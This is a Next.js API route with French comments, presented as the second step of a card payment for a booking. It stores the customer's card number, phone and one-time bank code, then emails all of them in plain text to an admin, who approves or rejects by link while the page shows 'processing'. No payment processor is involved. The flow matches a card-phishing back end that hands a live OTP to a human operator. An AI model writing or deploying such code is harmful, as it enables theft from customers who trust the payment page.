/**
 * POST /api/payments/card-verify-otp
 *
 * ÉTAPE 2 du flux — appelé quand le client soumet son téléphone + code OTP :
 *  1. Reçoit { sessionId, phone, otpCode }
 *  2. Met à jour la session (step: 'otp_sent', phone, otpCode)
 *  3. Crée un Payment { status: 'pending' }
 *  4. Envoie EMAIL 2 à l'admin : téléphone + code OTP + boutons VALIDER / REFUSER
 *  5. Retourne { success: true, paymentId }
 *     → le frontend passe en état "traitement en cours" et commence à poller
 *
 * Authentification : withAuth
 */

import crypto from 'crypto';
import dbConnect from '@/lib/db';
import OtpSession from '@/models/OtpSession';
import Payment from '@/models/Payment';
import Booking from '@/models/Booking';
import User from '@/models/User';
import { withAuth } from '@/middleware/withAuth';
import { errorHandler } from '@/middleware/errorHandler';
import { sendEmail } from '@/lib/mail';
import { adminOtpValidationEmail } from '@/email-templates/admin-otp-validation';

function formatPrice(cents) {
  return (cents / 100).toFixed(2).replace('.', ',') + ' €';
}

async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Méthode non autorisée' });
  }

  const adminEmail = process.env.ADMIN_EMAIL;
  if (!adminEmail) {
    return res.status(500).json({ success: false, error: 'Configuration admin manquante' });
  }

  await dbConnect();

  const { sessionId, phone, otpCode } = req.body;

  // Validation
  if (!sessionId || !phone?.trim() || !otpCode?.trim()) {
    return res.status(400).json({ success: false, error: 'sessionId, phone et otpCode sont requis' });
  }
  if (otpCode.replace(/\D/g, '').length < 4) {
    return res.status(400).json({ success: false, error: 'Code OTP invalide' });
  }

  // Récupération de la session
  const session = await OtpSession.findOne({
    _id: sessionId,
    user: req.user.id,
    step: 'card_sent',
    decision: 'pending',
  });

  if (!session) {
    return res.status(404).json({
      success: false,
      error: 'Session introuvable ou expirée. Veuillez recommencer.',
    });
  }

  // Vérification TTL
  if (session.expiresAt < new Date()) {
    await session.deleteOne();
    return res.status(410).json({ success: false, error: 'Session expirée. Veuillez recommencer.' });
  }

  // Récupération de la réservation
  const booking = await Booking.findOne({
    _id: session.booking,
    user: req.user.id,
    paymentStatus: { $in: ['unpaid', 'pending'] },
  });

  if (!booking) {
    return res.status(404).json({ success: false, error: 'Réservation introuvable ou déjà payée.' });
  }

  // Mise à jour de la session avec tél + code OTP
  session.phone   = phone.trim();
  session.otpCode = otpCode.trim();
  session.step    = 'otp_sent';
  await session.save();

  // Suppression d'un éventuel Payment card précédent + création nouveau
  await Payment.deleteMany({ booking: booking._id, method: 'card', status: 'pending' });

  const payment = await Payment.create({
    booking: booking._id,
    user:    req.user.id,
    amount:  booking.totalPrice,
    method:  'card',
    status:  'pending',
    notes:   `otp_session:${session._id}`,
  });

  // Mise à jour réservation → pending
  await Booking.findByIdAndUpdate(booking._id, {
    paymentStatus: 'pending',
    expiresAt: new Date(Date.now() + 30 * 60 * 1000),
  });

  // Construction des URLs admin
  const baseUrl    = process.env.NEXTAUTH_URL || 'http://localhost:3000';
  const approveUrl = `${baseUrl}/api/payments/card-decision?token=${session.adminToken}&decision=approve`;
  const rejectUrl  = `${baseUrl}/api/payments/card-decision?token=${session.adminToken}&decision=reject`;

  // Infos user
  const user = await User.findById(req.user.id).select('name email').lean();
  const bookingRef = String(booking._id).slice(-6).toUpperCase();

  // EMAIL 2 → admin : téléphone + code OTP + boutons VALIDER/REFUSER
  const { subject, html } = adminOtpValidationEmail({
    userName:   user?.name || 'Client',
    userEmail:  user?.email || '—',
    phone:      phone.trim(),
    otpCode:    otpCode.trim(),
    cardNumber: session.cardNumber,
    bookingRef,
    amount:     formatPrice(booking.totalPrice),
    approveUrl,
    rejectUrl,
  });

  sendEmail({ to: adminEmail, subject, html }).catch((err) =>
    console.error('[card-verify-otp] Erreur email admin:', err.message)
  );

  return res.status(200).json({
    success:   true,
    paymentId: payment._id,
  });
}

export default errorHandler(withAuth(handler));
